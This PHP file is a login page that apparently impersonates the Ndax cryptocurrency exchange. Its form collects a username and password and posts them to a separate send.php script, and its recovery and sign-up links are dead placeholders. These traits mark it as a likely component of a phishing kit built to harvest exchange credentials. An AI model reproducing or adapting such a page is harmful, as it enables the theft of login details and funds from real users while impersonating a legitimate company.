<?php include_once './config.php';?>
<html lang="en">
    <?php
        unset($_SESSION['username']);
        unset($_SESSION['password']);
        unset($_SESSION['phone_number']);
    
        $title = "Ndax - Login | Canada's most secure crypto exchange";
        include_once './includes/meta.php'; 
    ?>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-6 form_div">
                    <?php include_once './includes/header.php'; ?>
                    <div class="row justify-content-center mt60">
                        <div class="col-sm-8 text-start">
                            <h1 class="h1 text-white fw-normal fs50">Log In</h1>
                            <form method="post" action="<?= base_url('send.php')?>" class="">
                                <div class="my40">
                                    <label class="form-label fs14 text-white" style="letter-spacing: 1.2px;">USERNAME</label>
                                    <input name="username" type="text" minlength="3" maxlength="50" required="" class="form-control rounded-pill form-control-add" placeholder="Username or email address" value="" >
                                </div>
                                <div class="my40">
                                    <label class="form-label fs14 text-white" style="letter-spacing: 1.2px;">PASSWORD</label>
                                    <input name="password" type="password" required="" minlength="3" maxlength="50" class="form-control rounded-pill form-control-add" placeholder="Password" value="">
                                </div>
                                <div class="text-center mx-auto d-grid gap-2 my40">
                                    <button type="submit" class="btn btn-primary btn-primary-2 rounded-pill py12 btn-block">Log In</button>
                                </div>
                                <div class="fs15 my25 fw-normal text-white text-center">
                                    <a href="#" class="text-warning-emphasis text-decoration-none">Forgot your password?</a> Don't have an account? <a class="text-warning-emphasis text-decoration-none" href="#"> Sign Up Now</a>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <?php include_once './includes/right.php'; ?>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>